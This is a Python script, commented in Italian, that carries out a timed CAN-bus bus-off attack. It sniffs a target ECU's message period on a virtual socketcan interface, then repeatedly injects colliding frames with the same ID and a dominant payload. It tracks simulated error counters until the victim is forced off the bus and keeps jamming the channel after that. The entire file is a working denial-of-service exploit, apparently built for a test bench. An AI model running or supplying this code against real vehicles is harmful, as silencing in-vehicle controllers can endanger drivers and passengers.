import can

import time

import sys

import random



# --- CONFIGURAZIONE ---

CAN_INTERFACE = 'vcan0'

TARGET_ID = 0x123 

BUS_OFF_THRESHOLD = 256

TEC_PASSIVE_THRESHOLD = 128



# Parametri per la stima della frequenza

SAMPLE_SIZE = 5 # Numero di campioni per stimare il periodo

INITIAL_TEC = 0

# ----------------------



def start_attacker_dynamic():

    

    try:

        bus = can.interface.Bus(channel=CAN_INTERFACE, bustype='socketcan')

        print(f"✅ [Attaccante] Connesso a {CAN_INTERFACE}.")

    except OSError as e:

        print(f"❌ [Attaccante] Errore di connessione: {e}")

        return



    # Variabili di stato

    victim_tec_sim = INITIAL_TEC

    adversary_tec_sim = INITIAL_TEC

    attack_counter = 0

    

    # Variabili per la stima del periodo

    timestamps = []

    estimated_period = 0.0



    # --- FASE 1: STIMA DELLA FREQUENZA ---

    print("\n🔍 [Attaccante] FASE 1: Stima della frequenza della Vittima...")

    

    while len(timestamps) < SAMPLE_SIZE:

        msg = bus.recv(timeout=1.0)

        

        if msg is not None and msg.arbitration_id == TARGET_ID:

            now = time.time()

            if len(timestamps) > 0:

                # Calcola l'intervallo rispetto all'ultimo timestamp

                interval = now - timestamps[-1]

                print(f"   [Sniff] Rilevato ID {hex(TARGET_ID)}. Intervallo misurato: {interval:.3f}s")

                timestamps.append(now)

                

            else:

                # Primo messaggio rilevato, inizia il conteggio

                timestamps.append(now)

                print(f"   [Sniff] Primo messaggio rilevato.")

        

        # Ignora i primi due (o più) timestamp per eliminare il tempo di avvio

        if len(timestamps) >= 2:

            estimated_period = (timestamps[-1] - timestamps[0]) / (len(timestamps) - 1)

        

    # Calcola la media dei periodi misurati (escludendo il primo punto)

    print(f"✅ [Attaccante] Stima completata. Periodo stimato (T): {estimated_period:.3f}s")

    

    # Se il periodo è irragionevolmente piccolo, impostiamo un minimo.

    if estimated_period < 0.01:

        print("⚠️ Periodo troppo breve o dati insufficienti. Imposto 5.0s.")

        estimated_period = 5.0



    # --- FASE 2: ATTACCO TEMPORIZZATO con TEC SIMULATO ---

    print(f"\n--- FASE 2: Attacco avviato con T = {estimated_period:.3f}s ---")

    

    # Imposta il tempo di partenza per la sincronizzazione

    next_attack_time = time.time() + estimated_period 



    while True: # Loop infinito per la persistenza

        

        time_to_wait = next_attack_time - time.time()

        

        if time_to_wait > 0:

            # Attendiamo il prossimo slot di trasmissione della Vittima

            time.sleep(time_to_wait)

        

        # Calcolo del TEC simulato

        if victim_tec_sim < BUS_OFF_THRESHOLD:

            # La logica TEC viene applicata solo se la Vittima non è ancora in Bus Off Teorico

            

            # Calcolo incremento (Fase 1: +8/+8, Fase 2: +7/-1)

            if victim_tec_sim < TEC_PASSIVE_THRESHOLD:

                victim_tec_change, adversary_tec_change = 8, 8

                fase_desc = "Fase 1 (Active)"

            else:

                victim_tec_change, adversary_tec_change = 7, -1 

                fase_desc = "Fase 2 (Passive)"

            

            victim_tec_sim += victim_tec_change

            adversary_tec_sim += adversary_tec_change



            # Stampa e Controllo Attaccante

            print(f"\n--- CICLO ATTACCANTE #{attack_counter+1} ({time.strftime('%H:%M:%S')}) ---")

            print(f"[{fase_desc}] TEC Sim: V={victim_tec_sim} ({victim_tec_change:+d}), A={adversary_tec_sim} ({adversary_tec_change:+d})")



            if adversary_tec_sim >= BUS_OFF_THRESHOLD:

                print("🚨🚨 [Attaccante] BUS OFF RILEVATO! L'attaccante si auto-disattiva. Interrompo l'attacco.")

                break

        

        else:

            # VITTMA È IN BUS OFF TEORICO (solo log)

            print(f"\n--- CICLO PERSISTENTE #{attack_counter+1} ({time.strftime('%H:%M:%S')}) ---")

            print(f"🔥 [Persistenza] Vittima in Bus Off (TEC {victim_tec_sim}). Continuo a bloccare il canale...")



        

        # Iniezione del messaggio malevolo (stesso ID e payload Dominante)

        try:

            random_data = [random.randint(0, 255) for _ in range(7)]

            attack_data = [0x00] + random_data # Primo byte dominante per forzare il conflitto

            

            msg_attack = can.Message(

                arbitration_id=TARGET_ID,

                data=attack_data, 

                is_extended_id=False

            )

            bus.send(msg_attack)

            print(f"💣 [Attaccante] Messaggio malevolo iniettato.")

            

        except can.CanError:

            # Se la Vittima è andata BUS-OFF e il kernel lo ha registrato, l'Attaccante potrebbe fallire nell'invio.

            print("⚠️ Errore CAN durante l'invio. L'Attaccante potrebbe essere in stato di errore.")

            pass # Continua l'attacco, lasciando che il loop infinito gestisca la persistenza.



        attack_counter += 1

        # Aggiorna il tempo di attacco successivo

        next_attack_time += estimated_period



    bus.shutdown()

    print("\n🛑 [Attaccante] Disconnesso.")



if __name__ == '__main__':

    start_attacker_dynamic()
